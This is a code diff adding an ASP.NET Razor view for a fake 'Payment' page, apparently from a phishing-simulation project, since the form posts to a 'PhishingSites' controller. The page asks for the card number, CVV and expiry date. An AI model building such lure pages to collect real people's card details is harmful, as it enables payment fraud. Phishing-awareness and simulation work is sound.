@@ -1,0 +1,53 @@
+@{
+    ViewData["Title"] = "Home Page";
+    Layout = null;
+    
+}
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <link rel="stylesheet" href="~/css/epic.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" charset="utf-8"></script>
+    
+</head>
+<body>
+<div class="login-form">
+    <div class="logo"><img src="~/images/logo.png" alt=""></div>
+    <h6 style="margin-top: 2rem">Payment</h6>
+
+    @using (Html.BeginForm("Error", "PhishingSites", FormMethod.Post))
+    {
+        <div class="textbox">
+            <input type="text" placeholder="Name on Card" required>
+            <span class="check-message hidden">Required</span>
+        </div>
+        <div class="textbox">
+            <input oninput="formatCreditCardNumber()" type="text" placeholder="Card Number" id="creditCard" name="creditCard" required>
+            <span class="check-message hidden">Required</span>
+        </div>
+        <div class="textbox">
+            <input oninput="CVV()" type="text" placeholder="CVV" maxlength="3" inputmode="numeric" id="cvv" required>
+            <span class="check-message hidden">Required</span>
+        </div>
+        <div class="textbox">
+            <input id="expirationDate"  oninput="formatDate()" maxlength="5" type="text" placeholder=" Card Expiration Date" required>
+            <span class="check-message hidden">Required</span>
+        </div>
+
+        <input type="submit" value="Pay" class="login-btn" id="submit-id">
+        <div class="privacy-link">
+            <a href="#">Privacy Policy</a>
+        </div>
+    }
+    
+</div>
+<script src="~/js/card.js"></script>
+<script src="~/js/epic.js"></script>
+<script src="~/js/epicRequirement.js"></script>
+</body>
+</html>
